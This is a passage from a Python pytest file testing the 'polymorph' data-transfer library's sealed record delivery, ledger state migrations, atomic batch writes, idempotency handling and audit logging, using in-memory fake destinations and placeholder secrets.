import json
import sqlite3
from collections.abc import Iterator
from dataclasses import replace
from datetime import UTC, datetime, timedelta
from decimal import Decimal
from enum import StrEnum
from pathlib import Path

import pytest

import polymorph.filesystem as filesystem
from polymorph.agents import (
    BlindDestinationAgent,
    BlindSourceAgent,
    BlindTransportRecord,
    PayloadCodec,
    SealedField,
)
from polymorph.audit import AuditLog
from polymorph.capabilities import (
    CapabilityAuthorizer,
    CapabilityGrant,
    CapabilityOperation,
    SignedCapabilityGrant,
)
from polymorph.connectors.base import (
    AtomicBatchCapabilities,
    BatchWriteItem,
    ConnectorCapabilities,
    DeliveryContext,
)
from polymorph.connectors.csv_file import CsvConnector
from polymorph.connectors.json_file import JsonFileConnector
from polymorph.crypto import RecipientKeyPair, TransferContext, seal_for_recipient
from polymorph.errors import ConnectorWriteError, IntegrityError, PolicyViolation, WriteOutcome
from polymorph.ledger import ClaimDisposition, DeliveryLedger, DeliveryState
from polymorph.models.mapping import MappingPlan, MappingRule
from polymorph.models.schema import FieldDescriptor, SchemaDescriptor
from polymorph.models.types import DataType, Sensitivity
from polymorph.observability import EventStream, EventWriteStatus
from polymorph.outbox import SourceOutbox
from polymorph.relay import RelayPolicy, RouteBinding, SealedRelayQueue
from polymorph.runtime import (
    AuditWriteStatus,
    DeliveryBatchInterrupted,
    DeliveryReceipt,
    DeliveryStatus,
    DestinationRuntime,
)
from polymorph.signing import SigningKeyPair, SourceTrustStore, TrustedSourceKey
from polymorph.spool import SealedSpool

_SCALAR_IDEMPOTENCY_CONTRACT_ID = "tests.memory.scalar-write/v1"
_BATCH_IDEMPOTENCY_CONTRACT_ID = "tests.memory.batch-and-scalar-write/v1"


def test_connector_capabilities_require_a_bounded_idempotency_contract_id() -> None:
    with pytest.raises(ValueError, match="require.*contract id"):
        ConnectorCapabilities(write_records=True, supports_idempotency=True)
    with pytest.raises(ValueError, match="requires the connector"):
        ConnectorCapabilities(
            write_records=True,
            idempotency_contract_id=_SCALAR_IDEMPOTENCY_CONTRACT_ID,
        )
    with pytest.raises(ValueError, match="bounded printable"):
        ConnectorCapabilities(
            write_records=True,
            supports_idempotency=True,
            idempotency_contract_id="x" * 129,
        )


class MemoryDestination:
    capabilities = ConnectorCapabilities(write_records=True)

    def __init__(self):
        self.records = []
        self.calls = 0

    def inspect_schema(self):
        raise NotImplementedError

    def write_records(self, records, *, context: DeliveryContext | None = None):
        self.calls += 1
        materialized = list(records)
        self.records.extend(materialized)
        return len(materialized)


class FailAfterWriteDestination(MemoryDestination):
    def write_records(self, records, *, context: DeliveryContext | None = None):
        super().write_records(records, context=context)
        raise RuntimeError("simulated lost acknowledgement")


class KnownRollbackDestination(MemoryDestination):
    def write_records(self, records, *, context: DeliveryContext | None = None):
        self.calls += 1
        list(records)
        raise ConnectorWriteError(
            "simulated destination rollback",
            outcome=WriteOutcome.NOT_COMMITTED,
        )


class IdempotentFailOnceDestination(MemoryDestination):
    capabilities = ConnectorCapabilities(
        write_records=True,
        supports_idempotency=True,
        idempotency_contract_id=_SCALAR_IDEMPOTENCY_CONTRACT_ID,
    )

    def __init__(self):
        super().__init__()
        self.seen = set()
        self.fail_once = True

    def write_records(self, records, *, context: DeliveryContext | None = None):
        assert context is not None
        self.calls += 1
        materialized = list(records)
        if context.idempotency_key not in self.seen:
            self.seen.add(context.idempotency_key)
            self.records.extend(materialized)
        if self.fail_once:
            self.fail_once = False
            raise RuntimeError("simulated lost acknowledgement")
        return len(materialized)


class AtomicMemoryDestination(MemoryDestination):
    capabilities = ConnectorCapabilities(
        write_records=True,
        transactional_write=True,
        atomic_batch_write=AtomicBatchCapabilities(
            max_records=100,
            max_wire_bytes=1024 * 1024,
        ),
    )

    def __init__(self):
        super().__init__()
        self.batch_calls = 0
        self.contexts: list[DeliveryContext] = []

    def write_batch(self, items: tuple[BatchWriteItem, ...]) -> int:
        self.batch_calls += 1
        self.records.extend(dict(item.values) for item in items)
        self.contexts.extend(item.context for item in items)
        return len(items)


class RetainingAtomicDestination(AtomicMemoryDestination):
    def __init__(self) -> None:
        super().__init__()
        self.retained_items: tuple[BatchWriteItem, ...] = ()

    def write_batch(self, items: tuple[BatchWriteItem, ...]) -> int:
        self.batch_calls += 1
        self.retained_items = tuple(items)
        return len(items)


class UnknownBatchOutcomeDestination(AtomicMemoryDestination):
    def write_batch(self, items: tuple[BatchWriteItem, ...]) -> int:
        super().write_batch(items)
        raise RuntimeError("simulated lost atomic batch acknowledgement")


class RejectedBatchDestination(AtomicMemoryDestination):
    def write_batch(self, items: tuple[BatchWriteItem, ...]) -> int:
        self.batch_calls += 1
        raise ConnectorWriteError(
            "simulated atomic rollback",
            outcome=WriteOutcome.NOT_COMMITTED,
        )


class IdempotentAtomicDestination(AtomicMemoryDestination):
    def __init__(self, *, cross_path_idempotency: bool) -> None:
        super().__init__()
        self.capabilities = ConnectorCapabilities(
            write_records=True,
            transactional_write=True,
            supports_idempotency=True,
            idempotency_contract_id=_BATCH_IDEMPOTENCY_CONTRACT_ID,
            atomic_batch_write=AtomicBatchCapabilities(
                max_records=100,
                max_wire_bytes=1024 * 1024,
                per_item_idempotency_across_batch_and_scalar=cross_path_idempotency,
            ),
        )
        self.seen_idempotency_keys: set[str] = set()

    def write_batch(self, items: tuple[BatchWriteItem, ...]) -> int:
        self.batch_calls += 1
        for item in items:
            if item.context.idempotency_key not in self.seen_idempotency_keys:
                self.seen_idempotency_keys.add(item.context.idempotency_key)
                self.records.append(dict(item.values))
            self.contexts.append(item.context)
        return len(items)

    def write_records(
        self,
        records,
        *,
        context: DeliveryContext | None = None,
    ) -> int:
        assert context is not None
        self.calls += 1
        materialized = list(records)
        if context.idempotency_key not in self.seen_idempotency_keys:
            self.seen_idempotency_keys.add(context.idempotency_key)
            self.records.extend(materialized)
        return len(materialized)


class MutableClock:
    def __init__(self) -> None:
        self.current = datetime(2026, 1, 1, tzinfo=UTC)

    def __call__(self) -> datetime:
        return self.current

    def advance(self, delta: timedelta) -> None:
        self.current += delta


def test_audit_append_failure_is_visible_without_retrying_committed_write(
    tmp_path, monkeypatch
) -> None:
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    audit = AuditLog(tmp_path / "audit.db")

    def fail_append(_event):
        raise OSError("simulated audit disk failure")

    monkeypatch.setattr(audit, "append", fail_append)
    runtime.audit = audit

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.DELIVERED
    assert not receipt.audit_recorded
    assert receipt.audit_status is AuditWriteStatus.APPEND_FAILED
    assert destination.calls == 1
    assert runtime.ledger.get(record).state is DeliveryState.COMMITTED


def test_spool_cleanup_failure_after_commit_never_invites_a_retry(tmp_path, monkeypatch) -> None:
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)

    def fail_cleanup(_record_digest: str) -> None:
        raise OSError("simulated spool cleanup failure")

    monkeypatch.setattr(runtime.spool, "remove", fail_cleanup)

    first = runtime.deliver(record)
    second = runtime.deliver(record)

    assert first.status is DeliveryStatus.DELIVERED
    assert first.reason_code == "sealed_spool_cleanup_failed"
    assert not first.retry_safe
    assert second.status is DeliveryStatus.DUPLICATE
    assert destination.calls == 1
    entry = runtime.ledger.get(record)
    assert entry is not None
    assert entry.state is DeliveryState.COMMITTED


def _transport(secret: str = "s3cr3t"):
    source = SchemaDescriptor(
        "source",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    plan = MappingPlan(
        "plan",
        source.id,
        target.id,
        source.fingerprint(),
        target.fingerprint(),
        (MappingRule("token", "token", "opaque_forward"),),
    )
    keys = RecipientKeyPair.generate()
    signer = SigningKeyPair.generate()
    record = BlindSourceAgent(
        tenant="tenant",
        source_connector_id="excel",
        destination_connector_id="db",
        source_schema=source,
        target_schema=target,
        plan=plan,
        destination_public_key=keys.public_bytes(),
        signing_key=signer,
        allow_unauthenticated_recipient_key=True,
    ).prepare_record({"token": secret}, record_id="r1", transfer_id="t1")
    trust = SourceTrustStore([TrustedSourceKey(signer.public_bytes(), "tenant", "excel")])
    return record, keys, plan, trust


def _runtime(tmp_path: Path, destination):
    record, keys, plan, trust = _transport()
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    runtime = DestinationRuntime(
        connector_id="db",
        agent=BlindDestinationAgent(
            keys.private_key,
            expected_tenant="tenant",
            expected_connector_id="db",
            allowed_plan_digests=frozenset({plan.digest()}),
            source_trust_store=trust,
        ),
        connector=destination,
        ledger=DeliveryLedger(tmp_path / "ledger.db"),
        spool=SealedSpool(tmp_path / "spool.db"),
        plan=plan,
        target_schema=target,
    )
    return record, runtime


def _batch_runtime(
    tmp_path: Path,
    destination: MemoryDestination,
    *,
    count: int = 3,
) -> tuple[tuple[BlindTransportRecord, ...], DestinationRuntime]:
    source = SchemaDescriptor(
        "source",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    plan = MappingPlan(
        "plan",
        source.id,
        target.id,
        source.fingerprint(),
        target.fingerprint(),
        (MappingRule("token", "token", "opaque_forward"),),
    )
    keys = RecipientKeyPair.generate()
    signer = SigningKeyPair.generate()
    trust = SourceTrustStore([TrustedSourceKey(signer.public_bytes(), "tenant", "excel")])
    source_agent = BlindSourceAgent(
        tenant="tenant",
        source_connector_id="excel",
        destination_connector_id="db",
        source_schema=source,
        target_schema=target,
        plan=plan,
        destination_public_key=keys.public_bytes(),
        signing_key=signer,
        allow_unauthenticated_recipient_key=True,
    )
    records = source_agent.prepare_records(
        tuple({"token": f"secret-{index}"} for index in range(count)),
        record_ids=tuple(f"r{index}" for index in range(count)),
        transfer_id="batch-transfer",
    )
    runtime = DestinationRuntime(
        connector_id="db",
        agent=BlindDestinationAgent(
            keys.private_key,
            expected_tenant="tenant",
            expected_connector_id="db",
            allowed_plan_digests=frozenset({plan.digest()}),
            source_trust_store=trust,
        ),
        connector=destination,
        ledger=DeliveryLedger(tmp_path / "batch-ledger.db"),
        spool=SealedSpool(tmp_path / "batch-spool.db"),
        plan=plan,
        target_schema=target,
    )
    return records, runtime


def _signed_wrong_plan_variant(
    record: BlindTransportRecord,
    runtime: DestinationRuntime,
) -> BlindTransportRecord:
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(signer.public_bytes(), record.tenant, record.source_connector)
    )
    field = record.fields[0]
    context = replace(field.context, plan_id="wrong-plan")
    envelope = seal_for_recipient(
        PayloadCodec.encode("authenticated-but-wrong-plan"),
        RecipientKeyPair(runtime.agent.private_key).public_bytes(),
        context,
    )
    return BlindTransportRecord(
        record.record_id,
        (SealedField(field.target_field_id, context, envelope),),
    ).signed(signer)


def test_atomic_batch_delivery_preserves_per_record_evidence(tmp_path: Path) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination)
    audit_signer = SigningKeyPair.generate()
    runtime.audit = AuditLog(tmp_path / "batch-audit.db", signer=audit_signer)
    runtime.events = EventStream(tmp_path / "batch-events.jsonl")

    receipts = runtime.deliver_many(records)

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.DELIVERED] * 3
    assert all(receipt.audit_status is AuditWriteStatus.RECORDED for receipt in receipts)
    assert all(
        receipt.operational_event_status is EventWriteStatus.RECORDED for receipt in receipts
    )
    assert destination.batch_calls == 1
    assert destination.calls == 0
    assert destination.records == [
        {"token": "secret-0"},
        {"token": "secret-1"},
        {"token": "secret-2"},
    ]
    assert [context.record_id for context in destination.contexts] == ["r0", "r1", "r2"]
    assert runtime.audit.verify(trusted_public_key=audit_signer.public_bytes()) == 3
    assert runtime.events.summary().event_types == {"delivery": 3, "delivery_batch": 1}
    batch_attempt_ids = {receipt.batch_attempt_id for receipt in receipts}
    assert len(batch_attempt_ids) == 1
    batch_attempt_id = batch_attempt_ids.pop()
    assert batch_attempt_id is not None
    assert len(batch_attempt_id) == 32
    durable_entries = tuple(runtime.ledger.get(record) for record in records)
    assert all(entry is not None for entry in durable_entries)
    assert all(entry.state is DeliveryState.COMMITTED for entry in durable_entries if entry)
    assert {entry.current_write_batch_attempt_id for entry in durable_entries if entry} == {
        batch_attempt_id
    }
    assert {
        entry.record_digest for entry in runtime.ledger.get_batch_attempt(batch_attempt_id)
    } == {record.digest() for record in records}


def test_legacy_invalid_metadata_does_not_suppress_sibling_batch_audit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination, count=2)
    current = records[0]
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(signer.public_bytes(), current.tenant, current.source_connector)
    )
    legacy_record_id = "legacy\nrecord"
    legacy_context = replace(current.fields[0].context, record_id=legacy_record_id)
    with monkeypatch.context() as legacy_issuer:
        legacy_issuer.setattr(TransferContext, "validate_new_metadata", lambda _self: None)
        legacy_envelope = seal_for_recipient(
            PayloadCodec.encode("legacy-secret"),
            RecipientKeyPair(runtime.agent.private_key).public_bytes(),
            legacy_context,
        )
        legacy = BlindTransportRecord(
            legacy_record_id,
            (SealedField("token", legacy_context, legacy_envelope),),
        ).signed(signer)
    runtime.audit = AuditLog(tmp_path / "legacy-batch-audit.db")

    receipts = runtime.deliver_many((current, legacy))

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.DELIVERED] * 2
    assert receipts[0].audit_status is AuditWriteStatus.RECORDED
    assert receipts[0].audit_recorded
    assert receipts[1].audit_status is AuditWriteStatus.APPEND_FAILED
    assert not receipts[1].audit_recorded
    assert runtime.audit.summary().events == 1
    assert destination.batch_calls == 1


@pytest.mark.parametrize(
    ("metadata_field", "legacy_value"),
    (
        ("record_id", "r" * 257),
        ("record_id", "legacy\nrecord"),
        ("transfer_id", "t" * 257),
        ("transfer_id", "legacy\ntransfer"),
    ),
)
def test_pre_boundary_metadata_drains_through_every_durable_boundary(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    metadata_field: str,
    legacy_value: str,
) -> None:
    destination = AtomicMemoryDestination()
    current_records, runtime = _batch_runtime(tmp_path, destination, count=2)
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(
            signer.public_bytes(),
            current_records[0].tenant,
            current_records[0].source_connector,
        )
    )

    def legacy_variant(record: BlindTransportRecord) -> BlindTransportRecord:
        field = record.fields[0]
        context = replace(field.context, **{metadata_field: legacy_value})
        envelope = seal_for_recipient(
            PayloadCodec.encode("pre-boundary-secret"),
            RecipientKeyPair(runtime.agent.private_key).public_bytes(),
            context,
        )
        record_id = legacy_value if metadata_field == "record_id" else record.record_id
        return BlindTransportRecord(
            record_id,
            (SealedField(field.target_field_id, context, envelope),),
        ).signed(signer)

    with monkeypatch.context() as legacy_issuer:
        legacy_issuer.setattr(TransferContext, "validate_new_metadata", lambda _self: None)
        if metadata_field == "record_id":
            records = (current_records[0], legacy_variant(current_records[1]))
        else:
            records = tuple(legacy_variant(record) for record in current_records)

    outbox = SourceOutbox(tmp_path / "legacy-chain-outbox.db")
    assert len(outbox.stage_many(records)) == 2
    outbox_records = tuple(item.record for item in outbox.pending(limit=2))
    relay = SealedRelayQueue(
        tmp_path / "legacy-chain-relay.db",
        RelayPolicy(
            (
                RouteBinding(
                    records[0].tenant,
                    records[0].source_connector,
                    records[0].destination_connector,
                    frozenset({records[0].plan_digest}),
                ),
            ),
            source_trust_store=runtime.agent.source_trust_store,
        ),
    )
    assert len(relay.enqueue_many(outbox_records)) == 2
    leased = relay.lease(destination_connector="db", lease_owner="legacy-worker", limit=2)
    assert len(leased) == 2
    runtime.spool.quarantine_many(
        (item.record for item in leased),
        reason_code="compatibility_probe",
    )
    spool_records: list[BlindTransportRecord] = []
    for item in leased:
        restored = runtime.spool.get(item.record.digest())
        assert restored is not None
        spool_records.append(restored)

    receipts = runtime.deliver_many(tuple(spool_records))

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.DELIVERED] * 2
    assert destination.batch_calls == 1
    assert runtime.spool.list_entries(limit=10) == ()
    acknowledgements = tuple((item.record.digest(), item.lease_id) for item in leased)
    relay.ack_many(acknowledgements, lease_owner="legacy-worker")
    assert all(outbox.ack_many(item.record.digest() for item in leased))
    assert relay.depth() == 0
    assert outbox.depth() == 0


def test_scalar_fallback_rejects_aggregate_wire_overflow_before_writes(
    tmp_path: Path,
) -> None:
    destination = MemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination, count=2)
    one_wire = len(records[0].canonical_wire_bytes())
    runtime.spool.max_batch_wire_bytes = one_wire

    with pytest.raises(ValueError, match="runtime wire byte limit"):
        runtime.deliver_many(iter(records))  # type: ignore[arg-type]

    assert destination.calls == 0
    assert destination.records == []
    assert all(runtime.ledger.get(record) is None for record in records)


def test_atomic_batch_does_not_mutate_items_retained_by_connector(tmp_path: Path) -> None:
    destination = RetainingAtomicDestination()
    records, runtime = _batch_runtime(tmp_path, destination)

    receipts = runtime.deliver_many(records)

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.DELIVERED] * 3
    assert [dict(item.values) for item in destination.retained_items] == [
        {"token": "secret-0"},
        {"token": "secret-1"},
        {"token": "secret-2"},
    ]


def test_later_internal_chunk_failure_preserves_completed_receipts(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = AtomicMemoryDestination()
    destination.capabilities = replace(
        destination.capabilities,
        atomic_batch_write=AtomicBatchCapabilities(
            max_records=2,
            max_wire_bytes=1024 * 1024,
        ),
    )
    records, runtime = _batch_runtime(tmp_path, destination, count=5)
    original_start = runtime.ledger.start_write_many
    calls = 0

    def fail_second_chunk(items, *, idempotency_contract_id=None) -> str:
        nonlocal calls
        calls += 1
        if calls == 2:
            raise RuntimeError("secret internal chunk failure")
        return original_start(items, idempotency_contract_id=idempotency_contract_id)

    monkeypatch.setattr(runtime.ledger, "start_write_many", fail_second_chunk)

    with pytest.raises(DeliveryBatchInterrupted) as raised:
        runtime.deliver_many(records)

    assert len(raised.value.completed_receipts) == 2
    assert all(
        receipt.status is DeliveryStatus.DELIVERED for receipt in raised.value.completed_receipts
    )
    assert destination.records == [{"token": "secret-0"}, {"token": "secret-1"}]
    assert "secret internal chunk failure" not in str(raised.value)


def test_first_chunk_internal_failure_preserves_earlier_quarantine_receipt(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination, count=2)
    malformed = _signed_wrong_plan_variant(records[0], runtime)

    def fail_write_boundary(
        _items: object,
        *,
        idempotency_contract_id: str | None = None,
    ) -> str:
        raise RuntimeError("secret internal first-chunk failure")

    monkeypatch.setattr(runtime.ledger, "start_write_many", fail_write_boundary)

    with pytest.raises(DeliveryBatchInterrupted) as raised:
        runtime.deliver_many((malformed, records[1]))

    assert len(raised.value.completed_receipts) == 1
    receipt = raised.value.completed_receipts[0]
    assert receipt.record_id == malformed.record_id
    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "destination_contract_failed"
    assert runtime.ledger.get(malformed).state is DeliveryState.QUARANTINED
    assert runtime.ledger.get(records[1]).state is DeliveryState.CLAIMED
    assert runtime.spool.get(malformed.digest()) is not None
    assert destination.records == []
    assert "secret internal first-chunk failure" not in str(raised.value)


def test_later_chunk_interruption_combines_prior_and_current_receipts(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = AtomicMemoryDestination()
    destination.capabilities = replace(
        destination.capabilities,
        atomic_batch_write=AtomicBatchCapabilities(
            max_records=2,
            max_wire_bytes=1024 * 1024,
        ),
    )
    records, runtime = _batch_runtime(tmp_path, destination, count=4)
    malformed = _signed_wrong_plan_variant(records[2], runtime)
    original_start = runtime.ledger.start_write_many
    calls = 0

    def fail_second_chunk(items, *, idempotency_contract_id=None) -> str:
        nonlocal calls
        calls += 1
        if calls == 2:
            raise RuntimeError("secret internal mixed-chunk failure")
        return original_start(items, idempotency_contract_id=idempotency_contract_id)

    monkeypatch.setattr(runtime.ledger, "start_write_many", fail_second_chunk)

    with pytest.raises(DeliveryBatchInterrupted) as raised:
        runtime.deliver_many((records[0], records[1], malformed, records[3]))

    completed = raised.value.completed_receipts
    assert [receipt.record_id for receipt in completed] == ["r0", "r1", "r2"]
    assert [receipt.status for receipt in completed] == [
        DeliveryStatus.DELIVERED,
        DeliveryStatus.DELIVERED,
        DeliveryStatus.QUARANTINED,
    ]
    assert destination.records == [{"token": "secret-0"}, {"token": "secret-1"}]
    assert runtime.ledger.get(malformed).state is DeliveryState.QUARANTINED
    assert runtime.ledger.get(records[3]).state is DeliveryState.CLAIMED
    assert "secret internal mixed-chunk failure" not in str(raised.value)


def test_delivery_many_repeated_identity_preserves_serial_semantics(tmp_path: Path) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination, count=2)

    receipts = runtime.deliver_many((records[0], records[1], records[0]))

    assert [receipt.status for receipt in receipts] == [
        DeliveryStatus.DELIVERED,
        DeliveryStatus.DELIVERED,
        DeliveryStatus.DUPLICATE,
    ]
    assert destination.batch_calls == 1
    assert destination.calls == 0
    assert destination.records == [{"token": "secret-0"}, {"token": "secret-1"}]
    assert receipts[0].batch_attempt_id == receipts[1].batch_attempt_id
    assert receipts[0].batch_attempt_id is not None
    assert receipts[2].batch_attempt_id == receipts[0].batch_attempt_id


def test_crashed_batch_attempt_survives_scalar_and_batch_ambiguous_claims(
    tmp_path: Path,
) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination)
    runtime.audit = AuditLog(tmp_path / "recovery-audit.db")
    runtime.events = EventStream(tmp_path / "recovery-events.jsonl")
    claims = runtime.ledger.claim_many(records)
    transitions = tuple(
        (record, str(claim.claim_token)) for record, claim in zip(records, claims, strict=True)
    )
    batch_attempt_id = runtime.ledger.start_write_many(transitions)

    recovered_claims = runtime.ledger.claim_many(records)
    assert [claim.disposition for claim in recovered_claims] == [ClaimDisposition.AMBIGUOUS] * 3
    assert {claim.batch_attempt_id for claim in recovered_claims} == {batch_attempt_id}

    receipts = (runtime.deliver(records[0]), *runtime.deliver_many(records[1:]))

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.AMBIGUOUS] * 3
    assert {receipt.reason_code for receipt in receipts} == {"previous_write_started_ambiguous"}
    assert {receipt.batch_attempt_id for receipt in receipts} == {batch_attempt_id}
    assert destination.batch_calls == 0
    assert destination.calls == 0
    audit_events = [json.loads(line)["event"] for line in runtime.audit.export_jsonl().splitlines()]
    assert {event["batch_attempt_id"] for event in audit_events} == {batch_attempt_id}
    events = runtime.events.read()
    assert {event.event_type for event in events} == {"delivery"}
    assert {event.correlation_id for event in events} == {
        runtime.events.correlation_id(f"record:{record.digest()}") for record in records
    }
    assert {receipt.correlation_id for receipt in receipts} == {
        runtime.events.correlation_id(f"record:{record.digest()}") for record in records
    }


def test_committed_batch_attempt_survives_scalar_and_batch_duplicate_claims(
    tmp_path: Path,
) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination)
    delivered = runtime.deliver_many(records)
    batch_attempt_id = delivered[0].batch_attempt_id
    assert batch_attempt_id is not None
    runtime.audit = AuditLog(tmp_path / "duplicate-recovery-audit.db")
    runtime.events = EventStream(tmp_path / "duplicate-recovery-events.jsonl")

    duplicates = (runtime.deliver(records[0]), *runtime.deliver_many(records[1:]))

    assert [receipt.status for receipt in duplicates] == [DeliveryStatus.DUPLICATE] * 3
    assert {receipt.batch_attempt_id for receipt in duplicates} == {batch_attempt_id}
    assert destination.batch_calls == 1
    assert destination.calls == 0
    audit_events = [json.loads(line)["event"] for line in runtime.audit.export_jsonl().splitlines()]
    assert {event["batch_attempt_id"] for event in audit_events} == {batch_attempt_id}
    events = runtime.events.read()
    assert [event.event_type for event in events].count("delivery") == 3
    assert [event.event_type for event in events].count("delivery_batch") == 0
    assert {receipt.correlation_id for receipt in duplicates} == {
        runtime.events.correlation_id(f"record:{record.digest()}") for record in records
    }


def test_legacy_batch_states_migrate_to_values_an_old_enum_rejects(tmp_path: Path) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination, count=4)
    claims = runtime.ledger.claim_many(records)
    transitions = tuple(
        (record, str(claim.claim_token)) for record, claim in zip(records, claims, strict=True)
    )
    runtime.ledger.start_write_many(transitions)
    connection = sqlite3.connect(runtime.ledger.path)
    try:
        connection.execute(
            "UPDATE deliveries SET state = ? WHERE record_id = ?",
            (DeliveryState.WRITE_STARTED.value, records[0].record_id),
        )
        connection.execute(
            "UPDATE deliveries SET state = ? WHERE record_id = ?",
            (DeliveryState.UNCERTAIN.value, records[1].record_id),
        )
        connection.execute(
            "UPDATE deliveries SET state = ? WHERE record_id = ?",
            (DeliveryState.CLAIMED.value, records[2].record_id),
        )
        connection.execute(
            """
            UPDATE deliveries
            SET state = ?, current_write_batch_attempt_id = NULL
            WHERE record_id = ?
            """,
            (DeliveryState.QUARANTINED.value, records[3].record_id),
        )
        connection.execute(
            "DELETE FROM polymorph_delivery_ledger_migrations "
            "WHERE migration_id = 'replay_fencing_v1'"
        )
        connection.commit()
    finally:
        connection.close()

    reopened = DeliveryLedger(runtime.ledger.path)
    migrated_states = tuple(reopened.get(record).state for record in records)

    assert migrated_states == (
        DeliveryState.BATCH_WRITE_STARTED,
        DeliveryState.BATCH_UNCERTAIN,
        DeliveryState.REPLAY_CLAIMED,
        DeliveryState.REPLAY_QUARANTINED,
    )

    class LegacyDeliveryState(StrEnum):
        CLAIMED = "claimed"
        WRITE_STARTED = "write_started"
        COMMITTED = "committed"
        UNCERTAIN = "uncertain"
        QUARANTINED = "quarantined"

    for state in migrated_states:
        with pytest.raises(ValueError):
            LegacyDeliveryState(state.value)


def test_v03_ledger_migrates_ambiguous_claim_and_quarantine_to_replay_fences(
    tmp_path: Path,
) -> None:
    records, _ = _batch_runtime(tmp_path, AtomicMemoryDestination(), count=2)
    path = tmp_path / "v03-ledger.db"
    now = datetime.now(UTC).isoformat()
    connection = sqlite3.connect(path)
    try:
        connection.execute(
            """
            CREATE TABLE deliveries (
                tenant TEXT NOT NULL,
                destination_connector TEXT NOT NULL,
                transfer_id TEXT NOT NULL,
                record_id TEXT NOT NULL,
                record_digest TEXT NOT NULL,
                plan_digest TEXT NOT NULL,
                state TEXT NOT NULL,
                created_at TEXT NOT NULL,
                updated_at TEXT NOT NULL,
                reason_code TEXT,
                PRIMARY KEY (tenant, destination_connector, transfer_id, record_id)
            )
            """
        )
        for record, state in zip(
            records,
            (DeliveryState.CLAIMED, DeliveryState.QUARANTINED),
            strict=True,
        ):
            connection.execute(
                """
                INSERT INTO deliveries VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    record.tenant,
                    record.destination_connector,
                    record.transfer_id,
                    record.record_id,
                    record.digest(),
                    record.plan_digest,
                    state.value,
                    now,
                    now,
                    "legacy-replay-outcome",
                ),
            )
        connection.commit()
    finally:
        connection.close()

    ledger = DeliveryLedger(path)

    migrated_claim = ledger.get(records[0])
    migrated_quarantine = ledger.get(records[1])
    assert migrated_claim is not None
    assert migrated_quarantine is not None
    assert migrated_claim.state is DeliveryState.REPLAY_CLAIMED
    assert migrated_quarantine.state is DeliveryState.REPLAY_QUARANTINED
    assert migrated_claim.claim_token is None
    assert migrated_claim.claim_expires_at is None
    assert migrated_claim.current_write_batch_attempt_id is None
    assert migrated_claim.idempotency_contract_id is None
    assert migrated_quarantine.claim_token is None
    assert migrated_quarantine.claim_expires_at is None
    assert migrated_quarantine.current_write_batch_attempt_id is None
    assert migrated_quarantine.idempotency_contract_id is None
    ambiguous = ledger.claim(records[0])
    assert ambiguous.disposition is ClaimDisposition.AMBIGUOUS
    assert ambiguous.state is DeliveryState.REPLAY_CLAIMED


def test_replay_fence_states_are_unknown_to_the_legacy_delivery_enum() -> None:
    class LegacyDeliveryState(StrEnum):
        CLAIMED = "claimed"
        WRITE_STARTED = "write_started"
        COMMITTED = "committed"
        UNCERTAIN = "uncertain"
        QUARANTINED = "quarantined"

    for state in (
        DeliveryState.REPLAY_CLAIMED,
        DeliveryState.REPLAY_WRITE_STARTED,
        DeliveryState.REPLAY_UNCERTAIN,
        DeliveryState.REPLAY_QUARANTINED,
    ):
        with pytest.raises(ValueError):
            LegacyDeliveryState(state.value)


def test_batch_attempt_index_migrates_to_a_partial_index(tmp_path: Path) -> None:
    path = tmp_path / "ledger.db"
    DeliveryLedger(path)
    connection = sqlite3.connect(path)
    try:
        connection.execute("DROP INDEX idx_deliveries_batch_attempt")
        connection.execute(
            "CREATE INDEX idx_deliveries_batch_attempt "
            "ON deliveries (current_write_batch_attempt_id)"
        )
        connection.commit()
    finally:
        connection.close()

    DeliveryLedger(path)
    connection = sqlite3.connect(path)
    try:
        row = connection.execute(
            "SELECT sql FROM sqlite_master "
            "WHERE type = 'index' AND name = 'idx_deliveries_batch_attempt'"
        ).fetchone()
    finally:
        connection.close()

    assert row is not None
    assert "WHERE current_write_batch_attempt_id IS NOT NULL" in str(row[0])


def test_safe_batch_rollback_retry_is_not_reclassified_on_reopen(tmp_path: Path) -> None:
    clock = MutableClock()
    destination = RejectedBatchDestination()
    records, runtime = _batch_runtime(tmp_path, destination)
    path = tmp_path / "safe-batch-retry-ledger.db"
